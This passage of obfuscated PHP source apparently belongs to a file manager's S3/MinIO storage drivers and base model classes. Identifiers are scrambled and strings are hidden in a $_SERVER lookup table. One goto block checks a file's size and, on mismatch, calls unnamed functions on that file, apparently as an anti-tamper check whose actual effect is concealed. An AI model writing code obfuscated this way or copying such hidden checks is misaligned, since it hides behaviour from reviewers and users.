($èâÅÔ¾) { $°óóÙ¬ü = array_diff($°óóÙ¬ü, array($åç´†Ì»)); $°óóÙ¬ü = count(array_unique($°óóÙ¬ü)); $âÚ÷Üòƒ = count(array_unique($âÚ÷Üòƒ)); return array($ûñÎ˜¡[239] => $°óóÙ¬ü, $ûñÎ˜¡[240] => $âÚ÷Üòƒ); } return !1; } public function listAll($·ÛÎ»Â›) { $ÀĞúŸ© =& $_SERVER[ïÃ°£«Ê]; $ ˜’ÇÃŞ = $this->fileList($·ÛÎ»Â›, $ÀĞúŸ©[12], !0); $¢¸™¸¥ä = array_to_keyvalue($ ˜’ÇÃŞ[$ÀĞúŸ©[86]], $ÀĞúŸ©[32]); foreach ($ ˜’ÇÃŞ[$ÀĞúŸ©[85]] as $É¾°Ú­—) { if (is_string($É¾°Ú­—)) { $¢¸™¸¥ä[$É¾°Ú­—] = array($ÀĞúŸ©[79] => 0); } } return $this->listAllFiles($·ÛÎ»Â›, $¢¸™¸¥ä); } public function canRead($ëÍ¼„ñ³) { $÷Ú©‘Ÿ =& $_SERVER[ïÃ°£«Ê]; $¼¬ıø = $this->client->getAccessControlPolicy($this->bucket, $ëÍ¼„ñ³); if (!$¼¬ıø) { return !1; } return in_array($¼¬ıø, array($÷Ú©‘Ÿ[241], $÷Ú©‘Ÿ[242], $÷Ú©‘Ÿ[243])) ? !0 : !1; } public function canWrite($Ù€ÚàÜ) { $”·º–ªÔ =& $_SERVER[ïÃ°£«Ê]; $ğùˆ¤‘Á = $this->client->getAccessControlPolicy($this->bucket, $Ù€ÚàÜ); if (!$ğùˆ¤‘Á) { return !1; } return in_array($ğùˆ¤‘Á, array($”·º–ªÔ[241], $”·º–ªÔ[242])) ? !0 : !1; } public function getContent($‘Ôú–ô­) { return $this->client->getObject($this->bucket, $‘Ôú–ô­); } public function setContent($„îÇÚœË, $Éäí˜ı = '', $§ƒí¦ıŠ = false) { $‹Äå¿É =& $_SERVER[ïÃ°£«Ê]; $„îÇÚœË = $§ƒí¦ıŠ ? trim($„îÇÚœË, $‹Äå¿É[8]) . $‹Äå¿É[8] : $„îÇÚœË; $Ù ²ú = get_file_mime(get_path_ext($„îÇÚœË)); $»øü…«˜ = $this->client->putObject($Éäí˜ı, $this->bucket, $„îÇÚœË, $‹Äå¿É[229], array(), $Ù ²ú); if (!$»øü…«˜) { return !1; } if ($§ƒí¦ıŠ) { return !0; } return $»øü…«˜ ? !0 : !1; } public function fileSubstr($òµ§¤ş¾, $Í£ì­ŒÛ, $¡Ë­ŠÃø) { $´üëäÎİ = $Í£ì­ŒÛ + $¡Ë­ŠÃø - 1; return $this->client->getObject($this->bucket, $òµ§¤ş¾, array($_SERVER[ïÃ°£«Ê][244] => "\x62\171\164\x65\x73\x3d{$Í£ì­ŒÛ}\55{$´üëäÎİ}")); } public function upload($Ãêìïôç, $°æ¦Ñ‡, $™Ã”ûğı = false, $ñ¼Äì« = REPEAT_REPLACE) { $»úòŒû =& $_SERVER[ïÃ°£«Ê]; if (!$°æ¦Ñ‡ || !@file_exists($°æ¦Ñ‡)) { return !1; } $úûÑÎÒÒ = array($»úòŒû[245] => @md5_file($°æ¦Ñ‡)); $“”à¨âÒ = array($»úòŒû[246] => get_file_mime(get_path_ext($Ãêìïôç))); if (IO::size($°æ¦Ñ‡) <= 1024 * 1024 * 200) { $’ÒñÃÖ  = $this->client->putObjectFile($°æ¦Ñ‡, $this->bucket, $Ãêìïôç, $»úòŒû[229], $úûÑÎÒÒ, $“”à¨âÒ); return !empty($’ÒñÃÖ ) ? $this->getPathOuter($Ãêìïôç) : !1; } $™È¢Âó = $this->client->multiUploadObject($°æ¦Ñ‡, $this->bucket, trim($Ãêìïôç, $»úòŒû[8]), $úûÑÎÒÒ, $“”à¨âÒ); return $™È¢Âó ? $this->getPathOuter($Ãêìïôç) : !1; } public function download($‘”Ê¾‚¾, $¼Ø´Ûß) { if (!@is_dir($this->pathFather($¼Ø´Ûß)) && !IO::mkdir($this->pathFather($¼Ø´Ûß))) { return !1; } $ıÎ¦¦Úš = $this->client->getObject($this->bucket, $‘”Ê¾‚¾, array(), $¼Ø´Ûß); return $ıÎ¦¦Úš !== !1 ? $¼Ø´Ûß : !1; } public function link($ã§‘¼ìæ, $–¶°‘œª = array()) { return $this->getPreSignedURL($ã§‘¼ìæ, 3600 * 12, $–¶°‘œª); } private function getPreSignedURL($•³ñŞıá, $”ŞÑæÎ¨, $Í‡øÉ¢Ì = array(), $‡’Ü¢ãË = "\x47\105\x54") { $¢áå­ä =& $_SERVER[ïÃ°£«Ê]; $•³ñŞıá = trim($•³ñŞıá, $¢áå­ä[8]); if ($this->signVer == $¢áå­ä[247]) { return $this->client->getPreSignedV2URL($this->bucket, $•³ñŞıá, $”ŞÑæÎ¨, $‡’Ü¢ãË, $Í‡øÉ¢Ì); } return $this->client->getPreSignedV4URL($this->bucket, $•³ñŞıá, $”ŞÑæÎ¨, array(), $‡’Ü¢ãË, $Í‡øÉ¢Ì); } public function fileOut($•ûÇÃĞÅ, $®˜çâ¢ó = false, $¿“¤Ä£° = false, $šŠƒ‡û‚ = '') { $½ÔŠ›üô =& $_SERVER[ïÃ°£«Ê]; if ($this->isFileOutServer()) { return $this->fileOutServer($•ûÇÃĞÅ, $®˜çâ¢ó, $¿“¤Ä£°, $šŠƒ‡û‚); } if (!$¿“¤Ä£°) { $¿“¤Ä£° = $this->pathThis($•ûÇÃĞÅ); } $‡ÛÉè½€ = get_file_mime(get_path_ext($¿“¤Ä£°)); if ($‡ÛÉè½€ == $½ÔŠ›üô[248]) { return parent::fileOut($•ûÇÃĞÅ, $®˜çâ¢ó, $¿“¤Ä£°, $šŠƒ‡û‚); } $ØÒÒÏ›ğ = array($½ÔŠ›üô[249] => $‡ÛÉè½€); if ($®˜çâ¢ó) { $ØÒÒÏ›ğ[$½ÔŠ›üô[250]] = $½ÔŠ›üô[251] . rawurlencode($¿“¤Ä£°); } else { } $±ä´ÚÁ = $this->link($•ûÇÃĞÅ, $ØÒÒÏ›ğ); $this->fileOutLink($±ä´ÚÁ); } public function fileOutServer($ş¤öšÀ¨, $Ñ¿·“î™ = false, $¼íó¥Ìò = false, $øÅáò¬„ = '') { parent::fileOut($ş¤öšÀ¨, $Ñ¿·“î™, $¼íó¥Ìò, $øÅáò¬„); } public function fileOutImageServer($°‘®±›…, $œÍé¹“ = 250) { parent::fileOutImage($°‘®±›…, $œÍé¹“); } public function fileOutLink($½Ñ´¯’‹) { $»éƒ‘¦é =& $_SERVER[ïÃ°£«Ê]; if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($»éƒ‘¦é[67], $»éƒ‘¦é[66], $»éƒ‘¦é[68])) && !get_url_scheme($this->endpoint) && substr($½Ñ´¯’‹, 0, 7) == $»éƒ‘¦é[216]) { $½Ñ´¯’‹ = $»éƒ‘¦é[217] . substr($½Ñ´¯’‹, 7); } header($»éƒ‘¦é[172] . $½Ñ´¯’‹); die; } public function hashMd5($éæÓÊŞû, $–ñ˜òº… = '') { $ªË…“¢ı = $this->objectMeta($éæÓÊŞû); if (!$ªË…“¢ı) { return !1; } $–ñ˜òº… = $–ñ˜òº… ? $–ñ˜òº… : _get($ªË…“¢ı, $_SERVER[ïÃ°£«Ê][252]); return $–ñ˜òº…; } public function uploadFormData($¼ÏìŸï, $îÅÖ±ÍÏ = 3600) { $¼ÓşÓçË =& $_SERVER[ïÃ°£«Ê]; if (!$this->_isClientAsync()) { $öƒØÎ¯ = $this->getPreSignedURL($¼ÏìŸï, $îÅÖ±ÍÏ, array(), $¼ÓşÓçË[253]); return array($¼ÓşÓçË[206] => str_replace($¼ÓşÓçË[216], $¼ÓşÓçË[254], $öƒØÎ¯)); } if (isset($GLOBALS[$¼ÓşÓçË[6]][$¼ÓşÓçË[92]][$¼ÓşÓçË[255]]) && $GLOBALS[$¼ÓşÓçË[6]][$¼ÓşÓçË[92]][$¼ÓşÓçË[255]] == $¼ÓşÓçË[228]) { return $this->uploadMultiData($¼ÏìŸï, $îÅÖ±ÍÏ); } if ($this->signVer == $¼ÓşÓçË[247]) { return $this->uploadFormDataV2($¼ÏìŸï, $îÅÖ±ÍÏ); } return $this->uploadFormDataV4($¼ÏìŸï, $îÅÖ±ÍÏ); } public function uploadFormDataV2($Ğ˜­Ø÷º, $©Óø¯ä = 3600) { $äµ›ä¢• =& $_SERVER[ïÃ°£«Ê]; $Ä®ÁÊ€ = $this->pathFather($Ğ˜­Ø÷º); $Ù¾¸¡¨Æ = $this->client->getHttpUploadPostParams($this->bucket, $Ä®ÁÊ€, $äµ›ä¢•[229], $©Óø¯ä); $·¼şÕ×° = array_merge((array) $Ù¾¸¡¨Æ, array($äµ›ä¢•[256] => $äµ›ä¢•[247], $äµ›ä¢•[206] => $this->getHost())); if ($this->_isClientAsync()) { unset($·¼şÕ×°[$äµ›ä¢•[256]]); } return $·¼şÕ×°; } public function uploadFormDataV4($ÑÂ¶İ‹ê, $Â¦Óçş© = 3600) { $³çéÜ¶ =& $_SERVER[ïÃ°£«Ê]; $ûåÖœ› = $³çéÜ¶[229]; $áòü‚Ş = $³çéÜ¶[257]; $ÑÕº›¨ = $³çéÜ¶[62]; $ş³¤£Öå = gmdate($³çéÜ¶[258]); $§ŠÉçé = gmdate($³çéÜ¶[259]); $¶‰Âóœš = $³çéÜ¶[260]; $ø¸Î×© = $Â¦Óçş© . $³çéÜ¶[12]; $·™¨‡Ê˜ = $³çéÜ¶[261]; $»ÇŠØ’Á = array($this->accessKey, $§ŠÉçé, $this->region, $ÑÕº›¨, $¶‰Âóœš); $óÀÌˆ± = implode($³çéÜ¶[8], $»ÇŠØ’Á); $©Ë¼ˆ°ù = array($³çéÜ¶[262] => gmdate($³çéÜ¶[263], strtotime($³çéÜ¶[264])), $³çéÜ¶[265] => array(array($³çéÜ¶[266] => $this->bucket), array($³çéÜ¶[267], $³çéÜ¶[268], $³çéÜ¶[12]), array($³çéÜ¶[267], $³çéÜ¶[269], $³çéÜ¶[12]), array($³çéÜ¶[270] => $·™¨‡Ê˜), array($³çéÜ¶[271] => $óÀÌˆ±), array($³çéÜ¶[272] => $áòü‚Ş), array($³çéÜ¶[273] => $ş³¤£Öå), array($³çéÜ¶[274] => $ø¸Î×©))); $”û‡í©ë = base64_encode(json_encode($©Ë¼ˆ°ù)); $‘æ‚Á— = hash_hmac($³çéÜ¶[275], $§ŠÉçé, $³çéÜ¶[276] . $this->secret, !0); $¬àËÎÖ = hash_hmac($³çéÜ¶[275], $this->region, $‘æ‚Á—, !0); $Áïş¬Ü = hash_hmac($³çéÜ¶[275], $ÑÕº›¨, $¬àËÎÖ, !0); $¦¦‰‚úÒ = hash_hmac($³çéÜ¶[275], $¶‰Âóœš, $Áïş¬Ü, !0); $¥¼¦øà = hash_hmac($³çéÜ¶[275], $”û‡í©ë, $¦¦‰‚úÒ); $æ Ò€´Í = array($³çéÜ¶[246] => $³çéÜ¶[12], $³çéÜ¶[270] => $·™¨‡Ê˜, $³çéÜ¶[277] => $”û‡í©ë, $³çéÜ¶[271] => $óÀÌˆ±, $³çéÜ¶[272] => $áòü‚Ş, $³çéÜ¶[273] => $ş³¤£Öå, $³çéÜ¶[274] => $ø¸Î×©, $³çéÜ¶[278] => $¥¼¦øà, $³çéÜ¶[256] => $³çéÜ¶[247], $³çéÜ¶[206] => $this->getHost()); if ($this->_isClientAsync()) { unset($æ Ò€´Í[$³çéÜ¶[256]]); } return $æ Ò€´Í; } public function uploadMultiData($Š€¬É¶Ã, $‡Ø…ƒù = 3600) { $èõ¶¸é =& $_SERVER[ïÃ°£«Ê]; $§›íĞÚ¿ = $this->signVer == $èõ¶¸é[247] ? gmdate($èõ¶¸é[279]) : gmdate($èõ¶¸é[280]); $Œ‡àİ³ê = array(); $€Ë¡Ì’Ø = $this->client->getUploadId($this->bucket, $Š€¬É¶Ã, $Œ‡àİ³ê); if (!$€Ë¡Ì’Ø) { return !1; } $ãÏÖºù = array($èõ¶¸é[281] => $€Ë¡Ì’Ø, $èõ¶¸é[206] => $this->getHost() . $èõ¶¸é[8] . $this->pathEncode($Š€¬É¶Ã), $èõ¶¸é[282] => $§›íĞÚ¿, $èõ¶¸é[95] => $Š€¬É¶Ã, $èõ¶¸é[256] => $this->signVer); if ($this->_isClientAsync()) { unset($ãÏÖºù[$èõ¶¸é[256]]); } return $ãÏÖºù; } public function uploadMultiAuth($¤Û¸©“ä, $†ÒòåÛ = array()) { $ˆ®Üôº =& $_SERVER[ïÃ°£«Ê]; if ($this->signVer == $ˆ®Üôº[247]) { if (isset($†ÒòåÛ[$ˆ®Üôº[283]])) { return $this->uploadPartAuthV2($¤Û¸©“ä, $†ÒòåÛ); } return $this->uploadListAuthV2($¤Û¸©“ä, $†ÒòåÛ); } if (isset($†ÒòåÛ[$ˆ®Üôº[283]])) { return $this->uploadPartAuthV4($¤Û¸©“ä, $†ÒòåÛ); } return $this->uploadListAuthV4($¤Û¸©“ä, $†ÒòåÛ); } public function uploadPartAuthV2($¹ìğöœí, $×•’§à = array()) { $«Öß¦Î‚ =& $_SERVER[ïÃ°£«Ê]; $Â³Ğô³É = $×•’§à[$«Öß¦Î‚[95]]; $ˆ±İóÒ‰ = gmdate($«Öß¦Î‚[279]); $»µˆŞ = array_intersect_key($×•’§à, array_flip(array($«Öß¦Î‚[283], $«Öß¦Î‚[281]))); ksort($»µˆŞ); $‚«ÃÖÃ = $»µˆŞ ? $«Öß¦Î‚[76] . http_build_query($»µˆŞ, null, $«Öß¦Î‚[284], PHP_QUERY_RFC3986) : $«Öß¦Î‚[12]; $şêİ¯§Ñ = array($«Öß¦Î‚[253], $«Öß¦Î‚[12], $«Öß¦Î‚[120], $«Öß¦Î‚[12], "\x78\x2d\141\155\172\x2d\144\x61\x74\x65\x3a{$ˆ±İóÒ‰}", $«Öß¦Î‚[8] . $this->bucket . $«Öß¦Î‚[8] . $this->pathEncode($Â³Ğô³É) . $‚«ÃÖÃ); $¼¼±…áü = implode($«Öß¦Î‚[285], $şêİ¯§Ñ); $õôù…†º = $this->client->__getSignature($¼¼±…áü); return array($«Öß¦Î‚[286] => $õôù…†º, $«Öß¦Î‚[282] => $ˆ±İóÒ‰); } public function uploadListAuthV2($êå£Òø¿, $À—±Ÿ£· = array()) { $â·®è =& $_SERVER[ïÃ°£«Ê]; $Ùí¢¨’ = $À—±Ÿ£·[$â·®è[95]]; $Ù‹äÃŠ® = $À—±Ÿ£·[$â·®è[281]]; $ß§—®Ê = $this->client->listParts($this->bucket, $Ùí¢¨’, $Ù‹äÃŠ®); if (!$ß§—®Ê) { return !1; } $ùõÈœşè = gmdate($â·®è[279]); $Ö«¤é€ = $â·®è[287] . $Ù‹äÃŠ®; $ùıèÊÖ = array($â·®è[288], $â·®è[12], $â·®è[120], $â·®è[12], "\170\55\x61\155\172\x2d\x64\x61\164\x65\x3a{$ùõÈœşè}", $â·®è[8] . $this->bucket . $â·®è[8] . $this->pathEncode($Ùí¢¨’) . $Ö«¤é€); $›„Ç—“ = implode($â·®è[285], $ùıèÊÖ); $¹Á×àşŠ = $this->client->__getSignature($›„Ç—“); return array($â·®è[286] => $¹Á×àşŠ, $â·®è[282] => $ùõÈœşè, $â·®è[289] => $ß§—®Ê); } public function uploadPartAuthV4($Ñ“úñ», $ƒ³áÚ²£ = array()) { $êêŒÜ¤ =& $_SERVER[ïÃ°£«Ê]; $Ñ€×îÔ = $ƒ³áÚ²£[$êêŒÜ¤[95]]; $¥µÏ¥¦Ä = array($êêŒÜ¤[273] => gmdate($êêŒÜ¤[280]), $êêŒÜ¤[290] => _get($ƒ³áÚ²£, $êêŒÜ¤[291], hash($êêŒÜ¤[275], $êêŒÜ¤[12]))); $Òğ‹µ¨³ = explode($êêŒÜ¤[208], $this->getHost()); $‚ØÉø•Ö = array($êêŒÜ¤[292] => $Òğ‹µ¨³[1], $êêŒÜ¤[293] => $êêŒÜ¤[12], $êêŒÜ¤[246] => $êêŒÜ¤[120], $êêŒÜ¤[294] => $ƒ³áÚ²£[$êêŒÜ¤[79]]); $£®ÙùÄİ = $êêŒÜ¤[253]; $ññ‘áÍı = $êêŒÜ¤[8] . $this->pathEncode($Ñ€×îÔ); $âçó©’” = array_intersect_key($ƒ³áÚ²£, array_flip(array($êêŒÜ¤[283], $êêŒÜ¤[281]))); $ü¨¯ÉÚü = $this->client->__getSignatureV4($¥µÏ¥¦Ä, $‚ØÉø•Ö, $£®ÙùÄİ, $ññ‘áÍı, $âçó©’”); return array($êêŒÜ¤[286] => $ü¨¯ÉÚü, $êêŒÜ¤[290] => $¥µÏ¥¦Ä[$êêŒÜ¤[290]], $êêŒÜ¤[282] => $¥µÏ¥¦Ä[$êêŒÜ¤[273]]); } public function uploadListAuthV4($‘Å¦‚ƒ, $ó‹˜Ÿèµ = array()) { $‘ó¢æí =& $_SERVER[ïÃ°£«Ê]; $…î…… = $ó‹˜Ÿèµ[$‘ó¢æí[95]]; $è‰Æõ˜ˆ = $ó‹˜Ÿèµ[$‘ó¢æí[281]]; $ƒÈ÷¿šÑ = $this->client->listParts($this->bucket, $…î……, $è‰Æõ˜ˆ); if (!$ƒÈ÷¿šÑ) { return !1; } $Å£Æ¤ş™ = $‘ó¢æí[295]; foreach ($ƒÈ÷¿šÑ as $íš¤ï‹æ) { $Å£Æ¤ş™ .= $‘ó¢æí[296] . "\x3c\x50\141\x72\164\x4e\165\155\x62\145\162\76{$íš¤ï‹æ[$‘ó¢æí[297]]}\74\x2f\x50\141\162\x74\x4e\x75\x6d\142\145\x72\76\12" . "\74\105\x54\141\x67\x3e{$íš¤ï‹æ[$‘ó¢æí[298]]}\x3c\x2f\105\x54\141\x67\76\xa" . $‘ó¢æí[299]; } $Å£Æ¤ş™ .= $‘ó¢æí[300]; $€Ã­´àÏ = array($‘ó¢æí[273] => gmdate($‘ó¢æí[280]), $‘ó¢æí[290] => hash($‘ó¢æí[275], $Å£Æ¤ş™)); $Ø±éåÛ = explode($‘ó¢æí[208], $this->getHost()); $¿½£üÈÎ = array($‘ó¢æí[292] => $Ø±éåÛ[1], $‘ó¢æí[246] => $‘ó¢æí[120], $‘ó¢æí[294] => strlen($Å£Æ¤ş™)); $ı½»Òæß = $‘ó¢æí[288]; $÷€»§¦£ = $‘ó¢æí[8] . $this->pathEncode($…î……); $Œ©´¥‘¤ = array($‘ó¢æí[281] => $è‰Æõ˜ˆ); $¾“¬áÕ± = $this->client->__getSignatureV4($€Ã­´àÏ, $¿½£üÈÎ, $ı½»Òæß, $÷€»§¦£, $Œ©´¥‘¤); return array($‘ó¢æí[286] => $¾“¬áÕ±, $‘ó¢æí[290] => $€Ã­´àÏ[$‘ó¢æí[290]], $‘ó¢æí[282] => $€Ã­´àÏ[$‘ó¢æí[273]], $‘ó¢æí[289] => $ƒÈ÷¿šÑ); } private function _isClientAsync() { $­õ²½—÷ =& $_SERVER[ïÃ°£«Ê]; static $û¶éİ‘à = null; if ($û¶éİ‘à === null) { $ıö¤Îä = isset($_REQUEST[$­õ²½—÷[301]]) ? json_decode($_REQUEST[$­õ²½—÷[301]], !0) : !1; $û¶éİ‘à = $ıö¤Îä && _get($ıö¤Îä, $­õ²½—÷[302]) == $­õ²½—÷[303]; } return $û¶éİ‘à; } public function getHost() { $ıàÚâ« =& $_SERVER[ïÃ°£«Ê]; $Çàê ö¾ = parent::getHost(); if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($ıàÚâ«[70], $ıàÚâ«[64], $ıàÚâ«[69], $ıàÚâ«[62]))) { return $Çàê ö¾ . $ıàÚâ«[8] . $this->bucket; } if ($this->osType == $ıàÚâ«[62] && !is_domain($Çàê ö¾)) { return $Çàê ö¾ . $ıàÚâ«[8] . $this->bucket; } $Çàê ö¾ = explode($ıàÚâ«[208], $Çàê ö¾); return $Çàê ö¾[0] . $ıàÚâ«[208] . $this->bucket . $ıàÚâ«[10] . $Çàê ö¾[1]; } public function size($ûà‰Ì½ş) { $´„»Èï§ = $this->objectMeta($ûà‰Ì½ş); return $´„»Èï§ ? $´„»Èï§[$_SERVER[ïÃ°£«Ê][79]] : 0; } public function info($·ÌâœÕ) { if ($this->isFolder($·ÌâœÕ)) { return $this->folderInfo($·ÌâœÕ); } else { if ($this->isFile($·ÌâœÕ)) { return $this->fileInfo($·ÌâœÕ); } } return !1; } public function exist($‚ÄœÔ‰ê) { return $this->isFile($‚ÄœÔ‰ê) || $this->isFolder($‚ÄœÔ‰ê); } public function isFile($·Ææš´Ñ) { return !$this->isFolder($·Ææš´Ñ) && $this->objectMeta($·Ææš´Ñ); } public function isFolder($«†ÌæØÌ) { return $this->cacheMethod($_SERVER[ïÃ°£«Ê][177], $«†ÌæØÌ); } protected function objectMeta($ÌÜçÂŒØ) { return $this->cacheMethod($_SERVER[ïÃ°£«Ê][179], $ÌÜçÂŒØ); } protected function _objectMeta($è¤ÍÉˆæ) { $¦•ÔÛ× =& $_SERVER[ïÃ°£«Ê]; $è¤ÍÉˆæ = rtrim($è¤ÍÉˆæ, $¦•ÔÛ×[8]); try { $«æş±àÆ = $this->client->getObjectInfo($this->bucket, $è¤ÍÉˆæ); if (!isset($«æş±àÆ[$¦•ÔÛ×[252]]) && isset($«æş±àÆ[$¦•ÔÛ×[304]])) { $«æş±àÆ[$¦•ÔÛ×[252]] = $«æş±àÆ[$¦•ÔÛ×[304]]; } } catch (Exception $¾·áÎß³) { $«æş±àÆ = !1; } if (!$«æş±àÆ) { } return $«æş±àÆ; } protected function _isFolder($Î¯éù¾¿) { $«ˆàÏÄÛ =& $_SERVER[ïÃ°£«Ê]; $Î¯éù¾¿ = rtrim($Î¯éù¾¿, $«ˆàÏÄÛ[8]) . $«ˆàÏÄÛ[8]; if ($Î¯éù¾¿ == $«ˆàÏÄÛ[12] || $Î¯éù¾¿ == $«ˆàÏÄÛ[8]) { return !0; } $°‚âê©ê = $this->client->getBucket($this->bucket, $Î¯éù¾¿, null, 1); if (empty($°‚âê©ê[$«ˆàÏÄÛ[236]])) { return !1; } $æ€å£ = $°‚âê©ê[$«ˆàÏÄÛ[236]][0][$«ˆàÏÄÛ[32]]; return stripos($æ€å£, $Î¯éù¾¿) === 0 ? !0 : !1; if (substr($æ€å£, -1) == $«ˆàÏÄÛ[8]) { return !0; } if (get_path_this($æ€å£) == get_path_this($Î¯éù¾¿)) { return !1; } return !0; } public function listObject($Ôà³ëÌ¨) { return $this->fileList($Ôà³ëÌ¨, $_SERVER[ïÃ°£«Ê][12], !0); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($ŠÔØ—®°) { $ãĞ¡´† =& $_SERVER[ïÃ°£«Ê]; parent::__construct($ŠÔØ—®°); $this->setSignVersion($ãĞ¡´†[247]); if (!$this->region) { $this->region = $ãĞ¡´†[305]; $this->setRegion($this->region); } $this->client->setHeadValid(!1); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function uploadFormData($‰¾øÆÇ¡, $›äÑ¥¾ = 3600) { $Áãïù‘» =& $_SERVER[ïÃ°£«Ê]; $Ì¥”ø¡­ = $Áãïù‘»[229]; $­ ¢¾££ = $Áãïù‘»[257]; $Üğ×°× = $Áãïù‘»[62]; $î„ÏŠŒ = gmdate($Áãïù‘»[258]); $èÄùğœ‰ = gmdate($Áãïù‘»[259]); $«¢ÛëõÍ = $Áãïù‘»[260]; $í—˜ûµ = $›äÑ¥¾ . $Áãïù‘»[12]; $ĞÄ«ÍÃ¼ = $Áãïù‘»[261]; $ó½éğª† = array($this->accessKey, $èÄùğœ‰, $this->region, $Üğ×°×, $«¢ÛëõÍ); $²£ä•‹¢ = implode($Áãïù‘»[8], $ó½éğª†); $¸àØŞÛÒ = array($Áãïù‘»[262] => gmdate($Áãïù‘»[263], strtotime($Áãïù‘»[264])), $Áãïù‘»[265] => array(array($Áãïù‘»[266] => $this->bucket), array($Áãïù‘»[306] => $Ì¥”ø¡­), array($Áãïù‘»[267], $Áãïù‘»[268], $Áãïù‘»[12]), array($Áãïù‘»[267], $Áãïù‘»[269], $Áãïù‘»[12]), array($Áãïù‘»[267], $Áãïù‘»[307], $Áãïù‘»[12]), array($Áãïù‘»[270] => $ĞÄ«ÍÃ¼), array($Áãïù‘»[271] => $²£ä•‹¢), array($Áãïù‘»[272] => $­ ¢¾££), array($Áãïù‘»[273] => $î„ÏŠŒ), array($Áãïù‘»[274] => $í—˜ûµ))); $ ¢…¨õ¨ = base64_encode(json_encode($¸àØŞÛÒ)); $ˆÉåÏ = hash_hmac($Áãïù‘»[275], $èÄùğœ‰, $Áãïù‘»[276] . $this->secret, !0); $²¾«ŒŸÌ = hash_hmac($Áãïù‘»[275], $this->region, $ˆÉåÏ, !0); $°ˆó·‚Î = hash_hmac($Áãïù‘»[275], $Üğ×°×, $²¾«ŒŸÌ, !0); $…ÔÅğß› = hash_hmac($Áãïù‘»[275], $«¢ÛëõÍ, $°ˆó·‚Î, !0); $¦ŞÖÚ‘í = hash_hmac($Áãïù‘»[275], $ ¢…¨õ¨, $…ÔÅğß›); $½åÜ˜ = array($Áãïù‘»[246] => $Áãïù‘»[12], $Áãïù‘»[294] => $Áãïù‘»[12], $Áãïù‘»[306] => $Ì¥”ø¡­, $Áãïù‘»[270] => $ĞÄ«ÍÃ¼, $Áãïù‘»[277] => $ ¢…¨õ¨, $Áãïù‘»[308] => $²£ä•‹¢, $Áãïù‘»[309] => $­ ¢¾££, $Áãïù‘»[310] => $î„ÏŠŒ, $Áãïù‘»[311] => $í—˜ûµ, $Áãïù‘»[312] => $¦ŞÖÚ‘í, $Áãïù‘»[206] => $this->getHost()); return $½åÜ˜; } } goto b¿„×àÅ¿; e‚øÑæÜÔ¿: function binCheckBigger($ÓòşÅ„, $Šİîî•) { return $ÓòşÅ„ > $Šİîî•; } $_SERVER[$_SERVER[øÃÑ²Œ][3]] = (base64_decode('OTI0Mw==')."\x32\x30")+0;$_7wcg="yzvfa36skh1jio0ntxrbuewd459g8q2mlpc71xpb5768uho2lq4wy0znrtkifvms9ja3d";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($»¥®¨ß, $ÅÏÛ¶¸Ó) { $°ëÇí«ˆ =& $_SERVER[ïÃ°£«Ê]; if (isset(self::$_methodList[$»¥®¨ß])) { return @call_user_func_array(self::$_methodList[$»¥®¨ß], $ÅÏÛ¶¸Ó); } else { if (method_exists($this, $»¥®¨ß)) { return call_user_func_array(array($this, $»¥®¨ß), $ÅÏÛ¶¸Ó); } else { think_exception(__CLASS__ . $°ëÇí«ˆ[4] . $»¥®¨ß . $°ëÇí«ˆ[5]); } } } public static function __callStatic($Ôµ–¶°¡, $ÅòşøßÎ) { if (isset(self::$_methodListStatic[$Ôµ–¶°¡])) { return call_user_func_array(self::$_methodListStatic[$Ôµ–¶°¡], $ÅòşøßÎ); } else { if (method_exists(self, $Ôµ–¶°¡)) { return call_user_func_array(array(self, $Ôµ–¶°¡), $ÅòşøßÎ); } else { show_json("{$Ôµ–¶°¡}\50\51\x20\x6e\x6f\164\x20\145\x78\151\163\x74\x3b", !1); } } } public static function addMethod($’áÕ‡„¸, $À­Éà›) { self::$_methodList[$’áÕ‡„¸] = $À­Éà›; } public static function addMethodStatic($¥Ø„Å¹É, $®´ß…’¯) { self::$_methodListStatic[$¥Ø„Å¹É] = $®´ß…’¯; } } goto a¢Î¸µ½Ó™; D”„ƒ”ñÅ±: $_file = $_SERVER[$_SERVER[ïÃ°£«Ê][1227]]; $_size = $_SERVER[ïÃ°£«Ê][1830]; if ($_SERVER[$_SERVER[ïÃ°£«Ê][1035]] != $_size($_file)) { $_getc = $_SERVER[ïÃ°£«Ê][1038]; $_getfile = $_SERVER[$_SERVER[ïÃ°£«Ê][1039]] . $_SERVER[ïÃ°£«Ê][1040]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ïÃ°£«Ê][285], $_getfilec); if (count($_getarrs) < $_SERVER[ïÃ°£«Ê][709]) { $exit = $_SERVER[ïÃ°£«Ê][1041]; $exit(); } $_act = $_SERVER[ïÃ°£«Ê][1228]; $_act($_file); } goto d™„ä±«ˆ; DË­êğİ‡Ğ: define($_SERVER[ïÃ°£«Ê][320], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\x61\142\x6c\145", "\157\162\144\145\x72", "\141\154\151\x61\163", "\x68\141\166\151\156\x67", "\147\162\157\165\160", "\154\157\143\x6b", "\144\151\163\x74\x69\x6e\x63\x74", "\141\165\164\157", "\146\x69\154\x74\x65\162", "\x76\141\x6c\151\x64\141\164\145", "\162\x65\163\x75\154\164", "\x62\151\x6e\144", "\164\x6f\153\x65\x6e"); public function __construct($¯­ñ­À« = '', $•²É§Œ† = '', $´›ÔÔÂÚ = '') { $Ğ™Ùü™¤ =& $_SERVER[ïÃ°£«Ê]; $this->_initialize(); if (!empty($¯­ñ­À«)) { if (strpos($¯­ñ­À«, $Ğ™Ùü™¤[10])) { list($this->dbName, $this->name) = explode($Ğ™Ùü™¤[10], $¯­ñ­À«); } else { $this->name = $¯­ñ­À«; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($•²É§Œ†)) { $this->tablePrefix = $Ğ™Ùü™¤[12]; } elseif ($Ğ™Ùü™¤[12] != $•²É§Œ†) { $this->tablePrefix = $•²É§Œ†; } else { 